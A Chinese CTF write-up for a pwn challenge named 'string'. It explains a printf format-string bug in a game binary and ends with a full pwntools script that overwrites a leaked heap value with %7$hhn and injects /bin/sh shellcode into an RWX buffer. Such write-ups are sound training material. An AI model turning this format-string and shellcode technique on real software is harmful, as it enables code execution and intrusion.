## **Topic** 
string

##**Steps**
格式化字符串漏洞利用

首先运行string.bin,可以看到运行结果是一个mud game：

![](res/pwn1_0.png)

大概玩了一下，发现这个游戏似乎只能死亡？每次到最后，龙都会直接把你打爆，然后gg。于是我们用IDA看一下大致逻辑:

```C
  if ( strlen(&s) <= 0xC )
  {
    puts("Creating a new player.");
    atHotel();
    findHole();
    meetDragon((_DWORD *)a1);
  }
  else
  {
    puts("Hei! What's up!");
  }
```

其中，`atHotel`就是故意用来坑人的（？），里面并没有什么有价值的漏洞，然而在`findHole`这个函数里面我们能看到:

```C
  if ( v1 == 1 )
  {
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    __isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    __isoc99_scanf("%s", &format);
    puts("Your wish is");
    printf(&format, &format);
    puts("I hear it, I hear it....");
  }
```

这个printf函数被IDA翻译除了点问题，如果看汇编的话会发现，此处就是printf(&format),这就是一个典型的printf格式化字符串漏洞！然后我们顺着看之后的逻辑，在`meetDragon`函数里面，有以下内容:

```C
  result = (unsigned int)a1[1];
  if ( *a1 == (_DWORD)result )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v2 = (__int64 (__fastcall *)(_QWORD, void *))mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    buf = v2;
    v4 = v2;
    read(0, v2, 0x100uLL);
    result = buf(0LL, v4);
  }
```

这里会发现，程序用mmap申请了一段**可读可写可执行的**空间，并且读入我们输入的内容，最后跳转上去执行。这个就是**典型的插入shellcode的位置**。（其实根据游戏剧情这里也提到了，巫师说【"I will help you! USE YOU SPELL"】，相当于是一种暗示。）shellcode就是一段简单的字节码，这里的shellcode能够完成提权攻击，可以利用pwntools或者上网查找都可以。

为了触发这个跳转，要实现a1[1] = result。这样看起来有点模糊，回溯这个a1的来源，我们能够在main函数看到:

```C
  v4 = malloc(8uLL);
  v5 = (__int64)v4;
  *v4 = 0x44;
  v4[1] = 0x55;
  printf("secret[0] is %x\n", v5, argv);
  printf("secret[1] is %x\n", v5 + 4);
  puts("do not tell anyone ");
  beginStory(v5);
```

这里的v4是一个堆上的地址，v4相当于是一个数组；然后这个游戏在一开始的时候就把堆的地址输出来了，并且让v4[0]和v4[1]的值分别赋予了两个不同的值。那么也就是说，只要这两个值相等，那么之前在`meetDragon`函数位置上的a1和result就能够相等，然后触发巫师过来帮忙让你输入shellcode的情节。

现在我们能够找到的漏洞就是这个printf格式化字符串漏洞。这个漏洞的成因就是【因为直接将printf的第一个参数让其可以输出】。举一个例子来说:

```
printf("%d",a);
```

这个表达式能够将a中的数据当作整数输出，【不管a是不是真的是int类型的变量】。那么，如果这个`"%d"`字符串是由我们来控制输入的话:

```
char input[20];
scanf("%s",input); // 此时输入%x,%x
printf(input,a);
```

那么显然，这里只有一个参数a，第二个%x就会【强行从printf中的第三个参数的位置上的数据读出并且进行显示】（为什么是第三个参数？这里需要知道printf函数调用的过程，具体就不细讲了，自己了解即可）。我们结合栈的图来看:

![](res/pwn1_1.png)

如上图，相当于是如下的情况:

```C
printf("%d %d %d",a,b,c);
```

也就是说，printf自己会维护一个栈指针，指向下一个栈中需要被输出的值的位置。然后，如果说，我们此时不传入c的话，栈指针是不知道的，它依然会移动到当前位置上，并且将这个位置上的值进行输出。
然后，对于格式化字符串，除了大家常见的%s,%x,%d等，有一个叫做**%n**的格式，它的功能是【将之前输出的字符串长度的总长写到指定的参数位置上】。举个例子来说:

```C
printf("123456%n", &a);
printf("a = %d",a);
```

那么此时，a的值就为6。为什么要传入a的地址？这个是因为%n的作用原理和%s类似，都是将当前的变量作为**指针**，写入指针所指向的地址。
知道了这个%n的功能，还知道了格式化字符串漏洞，那么我们这里就要想着，如何让a1[1] = result(a1[0])了。我们知道，这两个值的**【地址】**已经被泄露出来了。那么，如果我们**【把这个地址放到栈中的某个位置，然后利用%n，就能够往指定位置上写入指定的数字】**。大致格式图如下:

![](res/pwn1_2.png)

那么我们观察，有没有机会存入地址:

```C
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    __isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    __isoc99_scanf("%s", &format);
    puts("Your wish is");
```

回想上面这段代码，能够发现，v2处居然有输入整数的过程，而且很巧，这个整数【也放在栈上】，那么我们不久可以通过往这个整数变量中【写入我们要存放的a[1]的地址】，然后构造合理的输入字符串，完成往【a[1]中存放指定数值】的操作！

这里还要提到一个小技巧，比如说，我们此时printf如下:

```C
printf("v2 = %d, v1 = %d", v1, v2);
```

仔细看可以发现，上面的v2和v1写反了，但是如果我们不想改动这两个变脸的位置的话，我们可以使用POSIX标准引入的新的格式化字符串下的`$`符号，用法如下：

```
printf("%2$d %2$#x; %1$d %1$#x",16,17)
// 输出为  17 0x11; 16 0x10
```

也就是说，%n$x表示的是【把第n个参数输出来】。因为我们的整数本身也不一定是正好放在format参数的后面，而且这里的程序是64bit的，64bit传入参数的时候，之前的参数的会放在寄存器中，多余的参数才会放到栈上，传参的顺序为【rdi,rsi,rdx,rcx,r8,r9，栈】。
我们使用gdb调试程序，让其运行到可疑的位置上：

![](res/pwn1_3.png)

我输入的数字为123456，也就是0x1e24。这里能够看到，我们输入的数字被放到了传入参数的第二个位置（为什么？这个是运行时决定的，不具有通用性分析）。那么，此时参数的位置就相当于在【当前传入参数的第7个参数的位置上】，于是我们就能够构造攻击字符串:

```
0000000...00000000%7$n
|---  85 个 0 ---|
```

但是这个000也太多了。。。于是我们想到可以利用格式化字符串的**填充写法**，也就是说:

```
%08x
```

表示的是【输入长度为8的十六进制数，不足8位的时候，高位用0不足】
那么我们最终的攻击字符串就能够写成;

```
0x55*'a' + "%7$hhn"
```

其中%hhn表示的是，要将【输入长度为char类型的转换成int长度】，简单来说就是填充的多一点。。。期间我们还要保证输入的地址为一开始程序泄露出来的堆地址，也就是

![](res/pwn1_4.png)

这两个地址中的一个。

当然为了保证交互，这里还是得通过使用python的pwntools来完成:

```python
#   -*- coding:utf-8 -*-

from pwn import *

DEBUG = True
if DEBUG:
    ph = process("./string.bin")
    context.log_level = "debug"
    context.terminal= ['tmux','splitw','-h']
        gdb.attach(ph)
else:
    ph = remote("211.65.102.6",20003)
exp = 0x55*'a' + "%7$hhn"
def getAddr():
    ph.recvuntil("secret[0] is")
    sec_addr = int(ph.recvuntil("\n").strip(), 16)
    return sec_addr

def pwn(addr):
    ph.recvuntil("What should your character's name be:")
    ph.sendline("link")
    ph.recvuntil("?east or up?:")
    ph.sendline("east")
    ph.recvuntil("or leave(0)?:")
    ph.sendline("1")
    ph.recvuntil("an address'")
    ph.sendline(str(addr))
    ph.recvuntil("And, you wish is:")
    ph.sendline(exp)
    ph.recvuntil("I will help you! USE YOU SPELL")
    ph.sendline(asm(shellcraft.amd64.linux.sh(), arch='amd64'))


if __name__ == '__main__':
    addr = getAddr()
    pwn(addr)
    ph.interactive()

```


